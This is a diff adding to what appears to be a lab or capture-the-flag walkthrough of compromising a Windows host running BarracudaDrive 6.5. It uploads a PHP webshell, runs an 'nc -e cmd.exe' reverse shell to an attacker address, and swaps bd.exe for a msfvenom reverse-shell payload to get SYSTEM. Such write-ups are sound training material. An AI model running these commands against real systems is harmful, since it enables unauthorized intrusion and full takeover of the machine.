@@ -428,3 +428,72 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Tue Mar 22 12:00:33 2022 -- 1 IP address (1 host up) scanned in 2063.66 seconds
 
 ```
+
+BarracudaDrive runs on port 8000.
+
+![image](1)
+
+Browsing to Web-File-Server page.
+
+![image](2)
+
+Following the instructions to create an admin account.
+
+![image](3)
+
+![image](4)
+
+Browsing to Web-File-Server page again. Clicking on the fs link which takes us to the disk browsing page.
+
+![image](5)
+
+![image](6)
+
+By doing a directory busting on port 45332 we find the phpinfo.php page and learn that the website file is located at C:\xampp\htdocs.
+
+![image](7)
+
+Uploading php webshell file and Netcat program.
+
+![image](8)
+
+![image](9)
+
+Browsing to webshell page.
+
+![image](10)
+
+Starting a listener and executing the reverse shell command.
+
+```
+nc -e cmd.exe 192.168.49.109 8000
+```
+
+![image](11)
+
+![image](12)
+
+### Privilege Escalation
+
+We can find BarracudaDrive 6.5 has a insecure folder permissions exploit on exploit-db. We know that the BarracudaDrive version is also 6.5 through the about page of the website.
+
+![image](13)
+
+Confirming execution privilege.
+
+![image](14)
+
+According to the vulnerability description we create a reverse shell payload.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.109 LPORT=8000 -f exe > bd.exe
+```
+![image](15)
+
+Uploading the payload file and replacing the original bd.exe.
+
+![image](16)
+
+We reboot the machine and wait for a while to get the shell with nt authority\system permission.
+
+![image](17)
